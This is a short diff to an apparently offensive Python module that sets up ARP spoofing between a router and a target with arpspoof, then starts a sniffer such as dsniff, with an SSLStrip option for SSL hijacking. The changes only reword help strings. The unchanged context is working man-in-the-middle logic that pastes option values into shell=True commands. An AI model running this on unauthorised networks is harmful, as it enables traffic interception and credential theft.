@@ -18,10 +18,10 @@ conf = {
 # List of the variables
 variables = OrderedDict((
 	('interface', ['eth0', 'Network interface name.']),
-	('router', ['192.168.1.1', 'Router ip address.']),
-	('target', ['192.168.1.2', 'Target ip address.']),
-	('sniffer', ['dsniff', 'Sniffer name (select from sniffer list).']),
-	('ssl', ['true', 'SSLStrip, for SSL hijacking [true/false].']),
+	('router', ['192.168.1.1', 'Router IP address.']),
+	('target', ['192.168.1.2', 'Target IP address.']),
+	('sniffer', ['dsniff', 'Sniffer name.']),
+	('ssl', ['true', 'SSLStrip, for SSL hijacking.']),
 ))
 
 # Additional notes to options
@@ -53,5 +53,5 @@ def run():
 	arp_spoofing2 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['router'][0] +' '+ variables['target'][0]
 	subprocess.Popen(arp_spoofing2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	printInfo("Sniffer starting...")
-	printInfo("Ctrl + C to end.")
+	printInfo("Ctrl + C to stop.")
 	os.system(selected_sniffer)
